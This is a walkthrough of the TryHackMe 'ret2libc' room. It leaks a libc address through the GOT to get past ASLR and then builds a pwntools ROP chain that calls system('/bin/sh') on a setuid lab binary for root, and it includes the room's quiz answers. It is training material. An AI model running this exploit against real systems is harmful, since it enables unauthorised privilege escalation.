<h1 align="center">ret2libc</h1>
<p align="center">2026, January 9 &nbsp; .  &nbsp; Hey! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>! Let´s learn together. Access this walkthrough room <a href="https://tryhackme.com/room/ret2libc">here</a>.<br><br><img width="1200px" src="https://github.com/user-attachments/assets/ca4bab91-1bc2-4c15-bd12-8d0bfb6215c6"></p>

<br>
<h2>Task 1 . Prerequisites</h2>
<p><strong>Before we start.</strong></p>
<p>This room is a bit more advanced. If you are new to binary exploitation, reverse engineering, basics of c programming and scripting with Python, I strongly recommend you do the rooms linked below first to get some essential knowledge.<br>

- <a href="https://tryhackme.com/room/win64assembly">Windows x64 Assembly</a><br>
- <a href="https://tryhackme.com/room/pythonbasics">Python Basics</a><br>
- <a href="https://tryhackme.com/room/introtopwntools">Intro to Pwntools</a><br>
- <a href="https://tryhackme.com/room/windowsreversingintro">Windows Reversing Intro</a></p>

<p><em>Answer the question below</em></p>

<p>1.1. <em>I know the essentials of binary exploitation and want to continue!</em><br>
<code>No answer needed</code></p>

<br>
<h2>Task 2 . Introduction</h2>
<p>So welcome to the room ret2libc! 😎<br>

Before we start, deploy the machine attached to the task by pressing the green "Start Machine" button, as well as the AttackBox if you don't want to bother installing additional tools (using the "Start AttackBox" button at the top of the page) or you can use your own machine and connect through OpenVPN.<br>

Keep in mind the booting can take up to 3 minutes.<br>

And while you wait, let me tell you what return-oriented programming (ROP) is and how the ret2libc attack works.</p>

<h3>Return oriented programming (ROP)</h3>
<p>

- The basis of return-oriented programming is chaining together small chunks of code already present within the binary itself in such a way as to do what we wish. For example, reading flag.txt file, or even better, getting a shell.</p>

<h3>ret2libc attack</h3>
<p>

- The ret2libc is ROP with a small difference. The difference is that these small chunks of code which we'll be using are in the dynamically linked c library called libc.<br>
- Why do we use libc? Well, it's already linked to our binary, and libc has some of the functions which are interesting to us. One of the functions which are useful to us is called "system" which lets us execute anything passed to it.<br>
- Now, what if I tell you that in libc, there is also a string value that looks like this: "/bin/sh". I think you now know where this is going.<br>
- All we have to do is create an ROP chain (small chunks of code chained together) that passes the "/bin/sh" string as the argument to the system function and then call this function.<br>

And that's it. You now know how the ret2libc attack works.<br>

<strong>If you are done reading, and your machine is ready, use these ssh credentials to connect</strong>:<br>

- Username: <strong>andy</strong><br>
- Password: <strong>---------</strong></p>

<p><em>Answer the questions below</em></p>

<p>2.1. <em>Start the machine!</em><br>
<code>No answer needed</code></p>

<br>
<p>2.2. <em>What is the name of the function which is essential for ret2libc attack?</em><br>
<code>system</code></p>


```bash
:~/ret2libc# ssh andy@cyberrose.thm
...
andy@...:~$ 
```

<img width="1266" height="635" alt="image" src="https://github.com/user-attachments/assets/2e8823b8-8be6-4e27-acf3-ec5163c12ce8" />

<br>
<br>
<br>

<h2>Task 3 . Tools used </h2>
<p>Throughout the room, I'll be using listed tools that make the process of binary exploitation and reverse engineering much easier. I'll provide you links to the official documentation of every tool so you can install them on your machine if they aren't already. <br>

<strong>Pwntools and gdb with gef are already preinstalled in the attached VM</strong>.</p>

<h3>Pwntools</h3>
<p>The first thing on this list is a python library called pwntools, which we'll use for creating our exploit script. Pwntools should already be installed on Kali Linux.<br>

Link (pwntools): https://docs.pwntools.com/en/stable/install.html</p>

<h3>gdb + gef</h3>
<p>The second thing on the list is the debugger, I use gdb with a plugin called gef, but if you are using any other plugin like pwndbg or peda, you should be fine as well. Gdb should be available as a package on your Linux distribution.br>

Link (gdb): https://www.sourceware.org/gdb/<br>

Link (gef): https://gef.readthedocs.io/en/master/#setup</p>

<h3>Ghidra</h3>
<p>And the last thing on this list is a reverse engineering tool called Ghidra. Ghidra is already installed in the THM Attack box, so if you don't want to bother with downloading it, you can use it there.<br>

Link (ghidra): https://ghidra-sre.org/</p>

<p><em>Answer the question below</em></p>

<p>3.1. <em>I understand which tools are used throughout the room, and I am ready to continue!</em><br>
<code>No answer needed</code></p>

<br>
<h2>Task 4 . Review of the binary</h2>
<p>After connecting to the box, go to the andy's home directory. There you should find a binary called exploit_me.<br>

You can see is that the binary is glowing red... hmm. What does that mean? I guess you already know that, but in case you don't, let's check the binary permissions.<br>

<code>ls -la exploit_me</code><br>

You can see there's a setuid bit in place which means we could maybe escalate privileges? (If the binary has a setuid bit set, it means you can run the binary as the owner of this binary). Let's keep this in mind for later and move on.</p>

<h3>Architecture</h3>
<p>The next thing we should check is the architecture of the binary, especially if it's a 32-bit or 64-bit executable. We can do that with the file command.</p>

<p><em>Architecture</em></p>

```bash
andy@ubuntu:~$ file exploit_me
exploit_me: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2c771960dddc76d1e69e8f741185d232c7ee6098, not stripped
```

<p>As you can see we're working with a 64-bit binary.<br>

You might ask, why does that matter to us? There are many things we can take from that information, but the crucial section to us is which calling conventions are being used.<br>

In short, calling conventions are a set of rules used, for example, when the program is calling functions or passing parameters.<br>

Later, when we craft our ROP chain, we have to apply these rules so the program can understand our instructions and our exploit script can work without any problems.<br>

Now that we know what the calling conventions are and which architecture is our binary. We just have to find the exact calling convention for our binary. I made it easy for you and already found it on the Wikipedia page here, almost at the bottom.</p>

<h6 align="center"><img width="800px" src="https://github.com/user-attachments/assets/c413f76f-2b5f-44a7-b84e-ee707169b9ef"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>


<p>The table above tells us which architecture this calling convention is, its name, which operating system, and on the right-hand side is the important stuff.  <br>

Let's use as an example any c-function that has one argument. Let's say puts, for example. Now let's go over what the last thing in this table tells us. It says that if we want to give some data as the argument to our puts, we first need to move the data into the $RDI register.<br>

If we would have some other function with more arguments, let's say three. For the first argument, we'd use register $RDI, for the second $RSI, and the last one $RDX.<br>

This way, our binary will understand what we want to pass as an argument to the function.</p>

<h3>Running the binary</h3>

<p>When we run a binary, it prompts us to type our name. When we do that, it prints out our name on the screen.</p>


<p><em>Running the binary</em></p>

```bash
andy@ubuntu:~$ ./exploit_me
Type your name:
andy
Your name is: andy
```

<p>The first thing that should hit our head when seeing the binary like this in the CTF is if the binary is vulnerable to buffer overflow. <br>

Let's try that by simply writing 30 A's instead of our name.</p>

<p><em>Buffer overflow</em></p>

```bash
andy@ubuntu:~$ ./exploit_me
Type your name:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Your name is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

<p>And as we can see, we got a segmentation fault which means that our binary is vulnerable to a buffer overflow attack.</p>

<h3>Finding the offset</h3>
<p>The next thing we need to figure out is the offset of this overflow. By offset, I mean the minimum number of A's (bytes) required for the segmentation fault to happen. We can find this in gdb and use a command called pattern, which comes with gef. Open the binary in the gdb with <code>gdb exploit_me</code><br>

Once we have our binary open, we need to generate the pattern that we'll be giving to our binary as an input instead of the  A's that we used earlier. Generate the pattern in gdb with the command <code>pattern create</code><br>

Once you have created the pattern, copy the output (= long text with lots of a's) and then run the binary inside of the gdb simply by typing: <code>r</code><br>

You'll get prompted for the name, so paste our created pattern here and hit enter. You should see values for the registers, the stack etc., from when the segmentation fault occurred, but that's not the important thing here. All we need to do is read the data from the $RSP register and use it in the pattern search command. We can do that easily with <code>pattern search $rsp</code><br>

If you followed me step by step, you should see the offset in the gdb by yourself and keep it in mind because we'll need it for crafting our exploit.<br>

<strong>Note</strong>: If we were working with a 32-bit binary, we'd look for the data for our pattern search in the $RIP register.</p>

<h3>Protections</h3>
<p>Another important part of reviewing the binary is looking for binary protections. For that, we can use command checksec, which comes preinstalled with <strong>pwntools</strong>.</p>

<p><em></em>Binary protections</em</p>

```bash
andy@ubuntu:~$ checksec exploit_me
[*] '/home/andy/exploit_me'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

<p>I'd like to talk about every protection in-depth but this would make this room even longer than it is, but if you followed my advice and completed room Intro To Pwntools, you should have a basic idea of what every protection is doing.<br>

The main things we should take from this:<br>

- The binary has <strong>Partial RELRO</strong>, which means that the global offset table is read and writable.<br>
- <strong>Stack canary</strong> isn't found, which means that if there is any buffer overflow, we can simply abuse it.<br>
- <strong>NX</strong> is enabled, which means that we cannot execute custom shellcode from the stack, and it's also the main reason we're using the ret2libc attack.<br>
- <strong>PIE</strong> is disabled, which means that our binary will always start at the address 0x400000 and won't be affected by ASLR.<br>

On the next task, we'll discuss the <strong>global offset table (GOT)</strong>, ASLR and how it affects our exploitation.</p>


<p><em>Answer the questions below</em></p>

<p>4.1. <em>What are the permissions of the exploit_me binary?</em> Hint: format: xxxxxxxxxx number owner group<br>
<code>-rwsrwxr-x 1 root root</code></p>

<br>
<p>4.2. <em>At which address will exploit_me binary start?</em><br>
<code>0x400000</code></p>


<br>
<p>4.3. <em>What is the overflow offset that we found in gdb?</em><br>
<code>18</code></p>

```bash
andy@...:~$ ls -la exploit_me
```

```bash
andy@...:~$ file exploit_me
```

<img width="1345" height="151" alt="image" src="https://github.com/user-attachments/assets/12a8ee4b-d9a9-4c7a-a640-a244956cc4c1" />

<br>
<br>

<img width="956" height="472" alt="image" src="https://github.com/user-attachments/assets/6ccff7eb-85fd-443c-82ea-a36e30e5ac9b" />

<br>
<br>
<br>

```bash
andy@...:~$ ./exploit_me
Type your name: 
rose
Your name is: rose
```

```bash
andy@...:~$ ./exploit_me
Type your name: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Your name is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

<img width="1343" height="212" alt="image" src="https://github.com/user-attachments/assets/99cf4ccb-10d1-4f2f-9fa0-54e5c6ac765e" />

<br>
<br>
<br>

```bash
gef➤ pattern create 200
[+] Generating a pattern of 200 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa...aabvaabwaabxaabyaab
[+] Saved as '$_gef0'
```

<img width="1339" height="798" alt="image" src="https://github.com/user-attachments/assets/cf7ec6c0-3ba7-4661-a564-45e28b4d7d74" />

<br>
<br>
<br>

```bash
gef➤ pattern search $rsp
[+] Searching for '$rsp'
[+] Found at offset 18 (little-endian search) likely
```


<img width="1342" height="123" alt="image" src="https://github.com/user-attachments/assets/116e1eff-3615-4091-8878-2a054f53e6e4" />

<br>
<br>
<br>


```bash
:~/ret2libc# chmod 777 exploit_me
```

```bash
:~/ret2libc# file exploit_me
exploit_me: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2c771960dddc76d1e69e8f741185d232c7ee6098, not stripped
```

```bash
:~/ret2libc# checksec exploit_me
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /root/.cache/.pwntools-cache-3.8/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] A newer version of pwntools is available on pypi (4.13.1 --> 4.15.0).
    Update with: $ pip install -U pwntools
[!] Could not populate PLT: module 'importlib.resources' has no attribute 'files'
[*] '/root/ret2libc/exploit_me'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

<img width="1319" height="386" alt="image" src="https://github.com/user-attachments/assets/023a24e8-1046-45e3-8096-f1e9bf996d3d" />

<br>
<br>
<br>
<h2>Task 5 . ASLR & GOT</h2>
<h3>Address space layout randomization (ASLR)</h3>
<p>Address space layout randomization is a technique involved in preventing exploitation of memory by randomly arranging the address space positions of key data areas of processes and the positions of the stack, heap and libraries.<br>

First of all, we can check if ASLR is turned on in our VM with the command:</p>

<p><em>ASRL check</em></p>

```bash
andy@ubuntu:~$ cat /proc/sys/kernel/randomize_va_space
2
```

<p>According to <a href="https://securityetalii.es/2013/02/03/how-effective-is-aslr-on-linux-systems/">Rosana</a> article, number 2 means full randomization. This means the ASLR is turned on.<br>

So how does it affect our binary, you might ask? Didn't I say that our binary isn't affected by ASLR because there is no PIE protection?<br>

Yes, you're right, it's not affected, but the thing which is being affected is the libc, which is dynamically linked to our binary and is mandatory for our ret2libc attack to work. If you look closer at the ASLR definition again, you can see the word library right at the end, and guess what libc is. Yes, that's right, it's a library.<br>

But, because of ASLR, we now cannot call the system function because we don't know the address of this function in libc.<br>

And even if we try to find the address of the system function when we run the program, the next time we run it, it'll be a different address. So how do we bypass this? Before telling you how to do that, let me quickly explain the global offset table.</p>

<h3>Global Offset Table (GOT)</h3>
<p>The global offset table is a section inside a program that holds addresses of dynamically linked functions<br>

Most programs don't include every function they use to reduce binary size. Instead, common functions, like those in libc, are "linked" into the program.<br>

All dynamic libraries are loaded into memory along with the main program at launch; however, functions aren't mapped to their actual code until they're first called.<br>

But, after these functions are called for the first time, their real addresses are "saved" in the section of the program called <srtong>.got.plt</code>.</p>

<h3>ASLR Bypass</h3>
<p>So, in theory, we need to leak the address of any function which is in libc and is being used in our binary (so it'll be saved in <srtong>.got.plt</code>). I'll show you how to find these functions later in Ghidra. But how do we leak it?<br>

We need some function that can print values and can take a pointer as an argument. The perfect functions for this are puts and <strong>printf</strong>.<br>

So what we can do now is to call puts and, as an argument, pass a pointer to any function that's inside <srtong>.got.plt</code>.<br>

For example: If we call puts and as an argument, we pass the address of the setbuf function inside of<srtong>.got.plt</code> section, then we should have leaked the real address of the sefbuf function inside a libc. And when we have this leak, we can calculate the base address of the libc.<br>

<strong>Libc base address => Start of the c library in memory</strong><br>

And when we have this base address, every time the binary is being run, the address is the same as it would have been when ASLR was turned off,  and from that, we can calculate offsets for every function inside of libc. Or we can even rebase our libc, which I'll talk about in the next task.<br>

Note: If you don't understand this on your first read, don't worry; take your time and read through it slowly. In the next tasks, I'll show you everything in practice so it might come all together once you see it.</p>

<p><em>Answer the question below</em></p>

<p>5.1. <em>What is the name of the section of the binary which is important for our leak?</em><br>
<code>.got.plt</code></p>


```bash
andy@...:~$ cat /proc/sys/kernel/randomize_va_space
2
```

<img width="1340" height="73" alt="image" src="https://github.com/user-attachments/assets/504d1aa9-4c14-4b87-9c98-fa9a7289ce1c" />

<br>
<br>
<br>
<h2>Task 6 . Examining in the Ghidra</h2>
<h3>Transfer the binary</h3>
<p>Ghidra is a GUI program, so we cannot run ghidra on an attached VM, but we have to run it on our own machine (or in the AttackBox) instead.<br> 

Before transferring the binary, make sure that your machine uses the same libc as the attached VM; otherwise, you could encounter some problems (you can use <code>ldd exploit_me</code> to do that). If you still have problems, I recommend using Kali Linux or the THM AttackBox to review the binary in ghidra.<br>

Let's start by transferring the exploit_me binary to your machine. We can do that with a python3 server.<br> 

In the attached VM run command:<br> 

<code>python3 -m http.server 4444</code><br> 

On your own machine (or in the AttackBox), run the command:<br> 

<code>wget http://10.65.166.144:4444/exploit_me</code></p>

<h3>Examine the binary in Ghidra</h3>
<p>Open the binary in Ghidra and analyze it. If you are ready, let's examine the main function.<br>

In the middle left is a window called Symbol Tree, and there's our main function inside a Functions folder; once you find it, double click on it.<br>

<code>Symbol Tree -> Functions -> main</code><br>

Now on the right side of the screen, you should see a decompiled main function that should look like this:</p>

<h6 align="center"><img width="300px" src="https://github.com/user-attachments/assets/92d27539-41ed-47e8-ae2c-ff184c2a9e18"><br>This image and all the theoretical content of<br>the present article is TryHackMe´s property.</h6>

<p>As you can see, Ghidra does a pretty good job when decompiling small binaries like ours.<br>

From what we can see, there's an array of chars called local_12 with a size of 10 bytes.<br> 

We know that our overflow offset is a little bigger than that. It's because, in memory between our buffer and instruction pointer, there is other data that we also need to overflow.<br>

On line 9, you can see that the input we provide to the binary is stored in this buffer. It's done by the gets function, which is dangerous, and you wouldn't use it in a standard program.<br>

Why is it dangerous? Because this function doesn't regulate the size of the input. This means we can provide input that is 30 bytes long, but our buffer only takes 10. This is why the segmentation fault is occurring. And it's also the reason why we can abuse this binary.<br>

There's another really interesting thing, and that's the setuid(0) function. It seems like a good day for us as an attacker.<br>

If you remember well, we found out that our binary had the setuid bit set, but that in itself wouldn't give us a root shell when running the exploit. That's because we aren't specifying the -p switch when passing our "/bin/sh" argument to our system function. In the libc, there is only string "/bin/sh" and not string "/bin/sh -p" which we'd need for that.<br>

The reason why it's not working without the -p switch is that the real UID of the process isn't matching the effective UID. If you want to read about real, effective and saved UID in Linux, you can click here.<br>

Anyway, this doesn't matter to us because we can escalate privileges with our ret2libc exploit even without the -p switch, thanks to the setuid(0) function inside of the binary</p>

<h3>Finding the leak function</h3>
<p>Now let's find our leak function.<br>

In the left upper corner, there's a window called Program Trees, where we can see sections of the program. We're interested in the section called .got.plt that we discussed earlier.<br>

<code>Program Trees -> exploit_me -> .got.plt</code><br>

When you double click on that, you should see which functions are in the .got.plt section.</p>

<h6 align="center"><img width="800px" src="https://github.com/user-attachments/assets/bb00fdcf-a8e2-489c-a50f-007d6e3c29dc"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<p>On the left, you can see an address next to each function, and that address is exactly the one that we'll be passing to the puts function as an argument. As I said in the previous task, we can choose any function from these three (puts, printf, gets); it doesn't matter which function as long as we keep in mind which we've chosen.<br>

I'll use gets as my leak function. Now we have our argument ready, and the only thing we need to do is pass it to the puts function. But how do we call puts?<br>

We can find puts in the procedure linkage table (PLT) and call it from there. I won't be talking about PLT here, but we need to know where to find this PLT section in Ghidra. If you want to learn more about PLT and even some more about GOT, you can watch a fantastic video from LiveOverflow called Global Offset Table (GOT) and Procedure Linkage Table (PLT) on YouTube, which I recommend.<br>

Now let's look at the .plt section.<br>

<code>Program Trees -> exploit_me -> .plt</code><br>

The puts function inside the .plt section looks like this.</p>

<h6 align="center"><img width="800px" src="https://github.com/user-attachments/assets/d051bd3e-1ffe-409e-8b58-75ece4659a4c"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>


<p>Now we have everything ready for our exploit!</p>

<p><em>Answer the questions below</em></p>

<p>6.1. <em>What is the name of the function that is under gets in .got.plt?</em><br>
<code>setuid</code></p>


<img width="1220" height="449" alt="image" src="https://github.com/user-attachments/assets/f83134c6-bc1f-4e87-ac81-36ead61f5591" />

<br>
<br>

<img width="1223" height="698" alt="image" src="https://github.com/user-attachments/assets/76e6ff5c-eab4-4f5f-87d6-99e504ea5b6a" />

<br>
<br>
<br>
<h2>Task 7 . Creating the exploit</h2>
<p>In this part, we'll create the exploit. Open vim or nano and create a new python script to start things off. If you prefer a different editor over vim or nano (which are installed in the attached VM), you can create this script on your own machine and then transfer it via a python server as we did with our exploit_me binary.</p>

<h3>Part 1</h3>

<p><em>Importing the library</em></p>

```bash
#!/usr/bin/env python3
from pwn import *
```

<p><code></code>#!/usr/bin/env python3</code> is a shebang that makes our script a standalone executable, which means we don't need to run the script with python3.<br>

On the second line, we see <code>from pwn import *</code> which means we're importing everything from the pwn library into our script.</p>

<h3>Part 2</h3>

<p><em>Defining variables</em></p>

```bash
context.binary = binary = './exploit_me'

elf = ELF(binary)
rop = ROP(elf)

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process()
```

<p>On the first line, we're assigning the exploit_me binary into the binary variable and then adding this binary to the context. Context is a global variable that automatically sets settings (like architecture, operating system, bit-width) for our binary. So later, when we'll use our binary variable, we don't have to specify every setting manually.<br>

On the next line, we're creating a variable called  <code>elf</code> so that we can manipulate it with our binary as an ELF object inside of our script. Once the variable has been created, we use that code>elf</code> variable to create an ROP object called code>rop</code>. We'll use both of these variables later in the code.<br>

Next, we're creating a variable called <code>libc</code> and assigning the full path of  <code>libc</code> to it. Our binary will be using  <code>libc</code> as an ELF object. If you don't know how to find which  <code>libc</code> our binary is using, you can do that with the command ldd: <code>ldd exploit_me</code><br>

The last thing we're doing is spawning our binary as a process. You can see that we didn't specify which process to spawn; that's because we added our binary into the context. Now we'll start creating the ROP chain to leak the gets function.</p>

<h3>Part 3</h3>

<p><em>First ROP chain</em></p>

```bash
padding = b'A'*18
payload = padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(elf.got.gets)
payload += p64(elf.plt.puts)
payload += p64(elf.symbols.main)
```

<h3>Part 4</h3>
<p><em>Sending and processing</em></p>

```bash
p.recvline()
p.sendline(payload)
p.recvline()
leak = u64(p.recvline().strip().ljust(8,b'\0'))
p.recvline()
```

<h3>Part 5</h3>
<p><em>Sending and processing</em></p>

```bash
log.info(f'Gets leak => {hex(leak)}')
libc.address = leak - libc.symbols.gets
log.info(f'Libc base => {hex(libc.address)}')
```

<h3>Part 6</h3>
<p><em>Second ROP chain</em></p>

```bash
payload = padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(libc.symbols.system)
```

<h3>Part 7</h3>
<p><em>Sending the final payload</em></p>

```bash
p.sendline(payload)
p.recvline()
p.interactive()
```

<p>Here we're just sending the second payload and cleaning out some unnecessary output. The last line starts the interactive mode, so we can interact with the created shell if everything went well.<br>

And that's about it. Go write the exploit yourself if you weren't following along step by step. And if you've done everything well, you should have root privileges, so go grab the flag!</p>


```bash
:~# nmap -sC -sV -Pn -n -T4 -p- xx.xx.xxx.xx
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
```

```bash
:~/ret2libc# objdump -d exploit_me | grep "plt>"
0000000000400490 <.plt>:
00000000004004a0 <puts@plt>:
  4004ab:	e9 e0 ff ff ff       	jmpq   400490 <.plt>
00000000004004b0 <printf@plt>:
  4004bb:	e9 d0 ff ff ff       	jmpq   400490 <.plt>
00000000004004c0 <gets@plt>:
  4004cb:	e9 c0 ff ff ff       	jmpq   400490 <.plt>
00000000004004d0 <setuid@plt>:
  4004db:	e9 b0 ff ff ff       	jmpq   400490 <.plt>
  4005d9:	e8 f2 fe ff ff       	callq  4004d0 <setuid@plt>
  4005e5:	e8 b6 fe ff ff       	callq  4004a0 <puts@plt>
  4005f6:	e8 c5 fe ff ff       	callq  4004c0 <gets@plt>
  40060e:	e8 9d fe ff ff       	callq  4004b0 <printf@plt>
```

```bash
:~/ret2libc# objdump -T exploit_me | grep GLIBC
0000000000000000      DF *UND*	0000000000000000  GLIBC_2.2.5 puts
0000000000000000      DF *UND*	0000000000000000  GLIBC_2.2.5 printf
0000000000000000      DF *UND*	0000000000000000  GLIBC_2.2.5 __libc_start_main
0000000000000000      DF *UND*	0000000000000000  GLIBC_2.2.5 gets
0000000000000000      DF *UND*	0000000000000000  GLIBC_2.2.5 setuid
```

```bash
andy@...:~$ ss -tunlp
Netid            State             Recv-Q            Send-Q                            Local Address:Port                         Peer Address:Port            Process            
udp              UNCONN            0                 0                                 127.0.0.53%lo:53                                0.0.0.0:*                                  
udp              UNCONN            0                 0                            xx.xx.xxx.xx%ens5:68                                0.0.0.0:*                                  
tcp              LISTEN            0                 128                                     0.0.0.0:22                                0.0.0.0:*                                  
tcp              LISTEN            0                 4096                              127.0.0.53%lo:53                                0.0.0.0:*                                  
tcp              LISTEN            0                 128                                        [::]:22                                   [::]:*  
```

```bash
:~/ret2libc# ldd exploit_me
	linux-vdso.so.1 (0x00007fffef76f000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f16c9633000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f16c9844000)
```


<img width="1320" height="797" alt="image" src="https://github.com/user-attachments/assets/9b56b787-fe4c-4e5d-a809-628475b75ce1" />

<br>
<br>
<br>

```bash
:~/ret2libc# scp andy@...:/lib/x86_64-linux-gnu/libc.so.6 .
andy@...'s password: 
libc.so.6                                                                                                                               100% 1982KB  84.4MB/s   00:00    
```

```bash
andy@...:~$ objdump -D exploit_me | grep puts
00000000004004a0 <puts@plt>:
  4004a0:	ff 25 72 0b 20 00    	jmpq   *0x200b72(%rip)        # 601018 <puts@GLIBC_2.2.5>
  4005e5:	e8 b6 fe ff ff       	callq  4004a0 <puts@plt>
```

```bash
andy@...:~$ objdump -D exploit_me | grep main
  400504:	ff 15 e6 0a 20 00    	callq  *0x200ae6(%rip)        # 600ff0 <__libc_start_main@GLIBC_2.2.5>
00000000004005c7 <main>:
```

```bash
andy@...:~$ objdump -D exploit_me | grep setuid
00000000004004d0 <setuid@plt>:
  4004d0:	ff 25 5a 0b 20 00    	jmpq   *0x200b5a(%rip)        # 601030 <setuid@GLIBC_2.2.5>
  4005d9:	e8 f2 fe ff ff       	callq  4004d0 <setuid@plt>
```


```bash
andy@...:~$ gdb exploit_me
...
gef➤ 
```

```bash
gef➤  disas main
Dump of assembler code for function main:
...
   0x00000000004005d9 <+18>:	call   0x4004d0 <setuid@plt>
   0x00000000004005de <+23>:	lea    rdi,[rip+0xbf]        # 0x4006a4
   0x00000000004005e5 <+30>:	call   0x4004a0 <puts@plt>
...
   0x00000000004005f6 <+47>:	call   0x4004c0 <gets@plt>
...
End of assembler dump.
```

```bash
gef➤ info files
Symbols from "/home/andy/exploit_me".
Local exec file:
	`/home/andy/exploit_me', file type elf64-x86-64.
	Entry point: 0x4004e0
	0x0000000000400238 - 0x0000000000400254 is .interp
	0x0000000000400254 - 0x0000000000400274 is .note.ABI-tag
	0x0000000000400274 - 0x0000000000400298 is .note.gnu.build-id
	0x0000000000400298 - 0x00000000004002b4 is .gnu.hash
	0x00000000004002b8 - 0x0000000000400360 is .dynsym
	0x0000000000400360 - 0x00000000004003b0 is .dynstr
	0x00000000004003b0 - 0x00000000004003be is .gnu.version
	0x00000000004003c0 - 0x00000000004003e0 is .gnu.version_r
	0x00000000004003e0 - 0x0000000000400410 is .rela.dyn
	0x0000000000400410 - 0x0000000000400470 is .rela.plt
	0x0000000000400470 - 0x0000000000400487 is .init
	0x0000000000400490 - 0x00000000004004e0 is .plt
	0x00000000004004e0 - 0x0000000000400692 is .text
	0x0000000000400694 - 0x000000000040069d is .fini
	0x00000000004006a0 - 0x00000000004006c7 is .rodata
	0x00000000004006c8 - 0x0000000000400704 is .eh_frame_hdr
	0x0000000000400708 - 0x0000000000400808 is .eh_frame
	0x0000000000600e10 - 0x0000000000600e18 is .init_array
	0x0000000000600e18 - 0x0000000000600e20 is .fini_array
	0x0000000000600e20 - 0x0000000000600ff0 is .dynamic
	0x0000000000600ff0 - 0x0000000000601000 is .got
	0x0000000000601000 - 0x0000000000601038 is .got.plt
	0x0000000000601038 - 0x0000000000601048 is .data
	0x0000000000601048 - 0x0000000000601050 is .bss
```

```bash
gef➤ pattern create 200
pattern create 200
[+] Generating a pattern of 200 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
```

```bash
gef➤ run
Starting program: /home/andy/exploit_me 
Type your name: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
```

<br>
<br>
<br>

```bash
gef➤  p system
$1 = {int (const char *)} 0x7fca25747290 <__libc_system>
```

```bash
gef➤  p exit
$2 = {void (int)} 0x7fca2573ba40 <__GI_exit>
```

```bash
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/andy/exploit_me
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/andy/exploit_me
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/andy/exploit_me
0x00000000216f9000 0x000000002171a000 0x0000000000000000 rw- [heap]
0x00007fca256f5000 0x00007fca25717000 0x0000000000000000 r-- /lib/x86_64-linux-gnu/libc-2.31.so
0x00007fca25717000 0x00007fca2588f000 0x0000000000022000 r-x /lib/x86_64-linux-gnu/libc-2.31.so
0x00007fca2588f000 0x00007fca258dd000 0x000000000019a000 r-- /lib/x86_64-linux-gnu/libc-2.31.so
0x00007fca258dd000 0x00007fca258e1000 0x00000000001e7000 r-- /lib/x86_64-linux-gnu/libc-2.31.so
0x00007fca258e1000 0x00007fca258e3000 0x00000000001eb000 rw- /lib/x86_64-linux-gnu/libc-2.31.so
0x00007fca258e3000 0x00007fca258e9000 0x0000000000000000 rw- 
0x00007fca258f1000 0x00007fca258f2000 0x0000000000000000 r-- /lib/x86_64-linux-gnu/ld-2.31.so
0x00007fca258f2000 0x00007fca25915000 0x0000000000001000 r-x /lib/x86_64-linux-gnu/ld-2.31.so
0x00007fca25915000 0x00007fca2591d000 0x0000000000024000 r-- /lib/x86_64-linux-gnu/ld-2.31.so
0x00007fca2591e000 0x00007fca2591f000 0x000000000002c000 r-- /lib/x86_64-linux-gnu/ld-2.31.so
0x00007fca2591f000 0x00007fca25920000 0x000000000002d000 rw- /lib/x86_64-linux-gnu/ld-2.31.so
0x00007fca25920000 0x00007fca25921000 0x0000000000000000 rw- 
0x00007ffd4e818000 0x00007ffd4e839000 0x0000000000000000 rw- [stack]
0x00007ffd4e921000 0x00007ffd4e925000 0x0000000000000000 r-- [vvar]
0x00007ffd4e925000 0x00007ffd4e927000 0x0000000000000000 r-x [vdso]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
```


```bash
gef➤4  grep "/bin/sh"
[+] Searching '/bin/sh' in memory
